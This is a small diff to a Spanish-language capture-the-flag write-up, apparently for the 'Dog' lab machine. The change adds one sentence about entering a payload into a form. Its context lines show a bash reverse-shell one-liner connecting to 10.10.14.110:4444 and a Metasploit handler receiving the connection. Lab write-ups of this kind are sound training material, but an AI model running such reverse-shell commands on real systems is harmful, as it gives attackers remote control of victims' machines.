@@ -170,6 +170,8 @@ What system user on Dog shares the same DB password?
 bash -c 'bash -i >& /dev/tcp/10.10.14.110/4444 0>&1'
 ```
 
+Introducimos el payload para recibir una reverse shell en el formulario. 
+
 ``` shell
 msf exploit(multi/handler) > run
 [*] Started reverse TCP handler on 10.10.14.110:4444 
